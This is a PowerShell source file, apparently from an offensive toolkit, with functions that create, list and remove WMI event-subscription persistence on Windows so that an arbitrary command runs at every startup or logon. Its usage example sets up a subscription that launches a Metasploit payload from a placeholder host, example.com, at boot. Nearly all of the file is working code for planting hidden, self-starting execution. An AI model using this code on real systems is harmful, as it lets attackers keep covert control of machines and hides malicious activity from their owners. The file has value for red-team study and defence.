function New-WmiPersistence {
    <#
      .SYNOPSIS 
      Creates persistence through WMI event subscriptions. Based on work by @mattifestation and @harmj0y from
      Empire and PowerSploit. 

      Author: Jared Haight (@jaredhaight)
      License: MIT License
      Required Dependencies: None
      Optional Dependencies: None

      .DESCRIPTION 
      This script allows you to specify arbitrary commands to be executed on system startup or on user login

      .PARAMETER Name
      The name to be used for the WMI Filter, Consumer and Binding
      
      .PARAMETER Commmad
      The command to run

      .PARAMETER Arguments
      The arguments to pass to the command when it's run.

      .PARAMETER OnStartup 
      Run the WMI event on Startup
      
      .PARAMETER OnLogon
      Run the WMI event on Login

      .EXAMPLE 
      PS C:\> New-WMIPersistence -Name Update -OnStartup -Command "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Arguments "-Command Invoke-MetasploitPayload example.com"

      Description
      -----------
      Create a WMI subscription that runs Invoke-MetasploitPayload when the computer starts.

      .LINK 
      Script source can be found at https://github.com/jaredhaight/PowerPunch/blob/master/Persistence/New-WMIPersistence.ps1
      
      .LINK
      Original implementation in PowerSploit: https://github.com/PowerShellMafia/PowerSploit/blob/master/Persistence/Persistence.psm1

      .LINK
      Implentation in Empire: https://github.com/adaptivethreat/Empire/blob/master/lib/modules/persistence/elevated/wmi.py

    #>


    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [string]$Name,

        [Parameter(Mandatory=$True)]
        [string]$Command,

        [string]$Arguments,

        [Parameter(ParameterSetName="OnStartup")]
        [switch]$OnStartup,

        [Parameter(ParameterSetName="OnLogon")]
        [switch]$OnLogon
    )

    if ($OnStartup -and $OnLogon) {
        Write-Error "Can not use both OnStartup and OnLogon at the same time."
        Break
    }

    if ($OnLogon) {
        $query = "Select * from __InstanceCreationEvent WITHIN 15 WHERE TargetInstance ISA 'Win32_LogonSession' and TargetInstance.LogonType = 2"
    }

    if ($OnStartup) {
        $query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
    }

    $filterArgs = @{
        Name=$Name;
        EventNameSpace="root\cimv2";
        QueryLanguage="WQL";
        Query=$query
    }
    $WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments $filterArgs

    $consumerArgs = @{
        Name="$Name";
        ExecutablePath= $Command;
        CommandLineTemplate ="$Command $Arguments"
    }
    $WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments $consumerArgs
    
    $instanceArgs = @{
        Filter=$WMIEventFilter;
        Consumer=$WMIEventConsumer
    }

    Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments $instanceArgs
}

Function Get-WmiPersistence {
    <#
      .SYNOPSIS 
      Gets WMI Objects related to persistence as created by New-WMIPersistence

      Author: Jared Haight (@jaredhaight)
      License: MIT License
      Required Dependencies: None
      Optional Dependencies: None

      .PARAMETER Name
      The name to used for when New-WMIPersistence was run

      .PARAMETER AllBindings
      Gets all FilterToConsumerBindings. Useful if you're not sure what the name of your 
      WMI objects were.

      .EXAMPLE 
      PS C:\> Get-WMIPersistence -Name Update 

      .LINK 
      Script source can be found at https://github.com/jaredhaight/PowerPunch/blob/master/Persistence/New-WMIPersistence.ps1
    
    #>
    [cmdletbinding()]
    Param(
        [Parameter(ParameterSetName="Name")]
        [string]$Name,

        [Parameter(ParameterSetName="AllBindings")]
        [switch]$AllBindings=$false
    )
    
    if (-not $AllBindings) {
        $filter = Get-WmiObject -Namespace "root/subscription" -Class __EventFilter -Filter "Name = '$Name'"

        if ($filter) {
            $filter
        }
        else {
            Write-Output "No __EventFilter named $Name found!"
        }

        $consumer = Get-WmiObject -Namespace "root/subscription" -Class CommandLineEventConsumer -Filter "Name = '$Name'"
    
        if ($consumer) {
            $consumer
        }
        else {
            Write-Output "No CommandLineEventConsumer named $ConsumerName found!"
        }
    }

    if ($AllBindings) {
        $filterToConsumerBinding = Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription
    }
    else {
        $filterToConsumerBinding = Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object { $_.Filter -match "$Name"}
    }

    if ($filterToConsumerBinding) {
        $filterToConsumerBinding
    }
    else {
        Write-Output "No FilterToConsumerBinding named $Name found!"
    }
}

Function Remove-WmiPersistence {
    <#
      .SYNOPSIS 
      Removes persistence created through New-WMIPersistence

      Author: Jared Haight (@jaredhaight)
      License: MIT License
      Required Dependencies: None
      Optional Dependencies: None

      .DESCRIPTION 
      This script removes the Filter, Consumer and Binding created by New-WMIPersistence

      .PARAMETER Name
      The name to used for when New-WMIPersistence was run

      .EXAMPLE 
      PS C:\> Remove-WMIPersistence -Name Update 

      .LINK 
      Script source can be found at https://github.com/jaredhaight/PowerPunch/blob/master/Persistence/New-WMIPersistence.ps1
    
    #>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [string]$Name
    )
    
    $filter = Get-WmiObject -Namespace "root/subscription" -Class __EventFilter -Filter "Name = '$Name'"

    if ($filter) {
        Write-Verbose "Removing Filter: $Name"
        $filter | Remove-WmiObject
    }
    else {
        Write-Warning "No __EventFilter named $Name found!"
    }

    $consumer = Get-WmiObject -Namespace "root/subscription" -Class CommandLineEventConsumer -Filter "Name = '$Name'"
    
    if ($consumer) {
        Write-Verbose "Removing Consumer: $Name"
        $consumer | Remove-WmiObject
    }
    else {
        Write-Warning "No CommandLineEventConsumer named $ConsumerName found!"
    }

    $filterToConsumerBinding = Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object { $_.Filter -match "$Name"}
    if ($filterToConsumerBinding) {
        Write-Verbose "Removing Binding: $Name"
        $filterToConsumerBinding | Remove-WmiObject
    }
    else {
        Write-Warning "No FilterToConsumerBinding named $Name found!"
    }
 }